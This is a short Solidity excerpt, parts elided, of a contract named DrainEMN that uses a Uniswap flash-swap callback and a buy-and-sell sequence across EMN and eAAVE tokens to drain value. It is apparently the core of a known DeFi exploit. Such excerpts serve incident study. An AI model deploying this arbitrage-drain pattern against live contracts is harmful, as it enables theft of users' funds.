...
contract DrainEMN is IUniswapV2Callee {
    ...
    function arb(uint fundingAmount) internal {
        ...
        IERC20(dai).approve(emn, fundingAmount);
        uint emnBought = EMN.buy(fundingAmount, 0);
        uint half = emnBought / 2;
        IERC20(emn).approve(eaave, emnBought);
        uint eaaveBought = EAAVE.buy(half, 0);
        EMN.sell(half, 0);
        uint emnBack = EAAVE.sell(eaaveBought, 0);
        EMN.sell(emnBack, 0);
    }
}
